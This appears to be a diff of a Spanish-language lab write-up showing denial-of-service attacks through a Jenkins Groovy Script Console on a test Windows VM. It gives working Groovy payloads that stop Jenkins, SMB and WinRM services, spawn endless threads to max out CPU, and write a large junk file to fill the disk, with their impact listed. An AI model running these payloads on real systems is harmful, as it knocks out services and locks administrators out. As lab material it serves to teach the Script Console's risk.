@@ -71,49 +71,80 @@ Obteniendo como respuesta lo siguiente
 
 # 4 COMANDOS DOS
 
-Primero detendremos Jenkins, desde el kali usaremos el siguiente comando
+### Primer paso, detendremos Jenkins, usando el siguiente comando
 
 ```
-ssh vagrant@10.0.2.3
-```
-
-una vez dentro pondremos lo siguiente
-
-```
-net stop jenkins
+"cmd /c net stop jenkins".execute()
 ```
 
 Resultando
 
-![DETENER JENKINS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781506242/detener_jenkins_whwfuz.png)
+![DETENER JENKINS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781576698/detener_jenkins_umz50k.png)
 
-Segundo verificamos que Jenkins se detuvo (desde Kali)
-
-```
-curl -s -o /dev/null -w "%{http_code}" http://10.0.2.3:8484/
-```
-
-Debe salir error, timeout o 000.
-
-![ERROR JENKINS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781506489/jenkins_detenido_error_skwjfk.png)
-
-Ahora reiniciamos Jenkins desde el Metasploitable via SSH
+### Segundo paso, detenemos los servicios criticos de windows:
 
 ```
-ssh vagrant@10.0.2.3
+// Detener el servidor de archivos SMB
+"cmd /c net stop lanmanserver".execute()
+
+// Detener el servicio de acceso remoto WinRM
+"cmd /c net stop winrm".execute()
 ```
 
+Con este paso realizado se tiene este impacto en caso sea una maquina real en un entorno real:
+
+* Se caen los archivos compartidos en red.
+* Las impresoras compartidas dejan de funcionar.
+* Otras maquinas no pueden acceder a recursos de esta VM.
+* Servicios que dependen de SMB (como ciertos backups) fallan.
+* Se bloquea la administración remota vía PowerShell.
+* Herramientas como Ansible, Chef, Puppet (que usan WinRM) pierden conexión.
+* Los administradores no pueden ejecutar comandos remotos en la máquina.
+
+![EJECUCIÓN DE COMANDOS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781602328/ejecutando_nihbhh.png)
+
+### Tercer paso, agotar CPU (for bomb en Groovy)
+
 ```
-net start jenkins
+while (true) {
+    Thread.start { while (true) {} }
+}
 ```
 
-![REACTIVAR JENKINS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781506773/reactivar_jenkins_sv2d1r.png)
+![AGOTAMOS LA MAQUINA VICTIMA](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781602676/agotar_CPU_llc3gp.png)
 
-# 5 COMANDOS UTILES PARA EXPLORAR
+Este comando lanza hilos infinitos que consumen el CPU victima sin parar.
+Con ello se tiene el siguiente impacto:
 
+* CPU al 100% en pocos segundos.
+* El sistema se congela (mouse/Keyboard no responden).
+* Otros procesos dejan de funcionar por falta de recursos.
+* La VM se vuelve inutilizable hasta reiniciar.
 
+### Cuarto paso, llenar el disco duro con basura
 
+```
+def f = new File("C:\\Windows\\Temp\\bomb.txt")
+def writer = f.newWriter()
+(1..500000).each { writer.writeLine("A" * 1000) }
+writer.close()
+println "Escrito: ${f.length() / 1024 / 1024} MB"
+```
 
+![LLENAMOS EL DISCO DURO](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781603195/LLENAMOS_EL_DISCO_DURO_nyrut7.png)
+
+con este comando hacemos que se escriba 500000 lineas de 1000 caracteres "A" en un archivo de 476 MB.
+El impacto seria:
+* Ocupa espacio en disco rapidamente.
+* Si el numero aumenta de 500000 a mas se puede llenar el disco duro.
+* Cuando el disco duro este lleno:
+  - Windows no puede crear archivos temporales.
+  - Los servicios fallan.
+  - El sistema se vuelve inestable.
+
+![RENDIMIENTO DE VM](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781603705/Rendimiento_de_VM_x3de9e.png)
+
+En conclusión, este Laboratorio desmuestra que la Script COnsole de Jenkins no es solo un problema de confidencialidad (robo de datos), sino tambien de disponibilidad. Un atacante puede destruir el servicio con solo poner unos códigos.
 
 
 
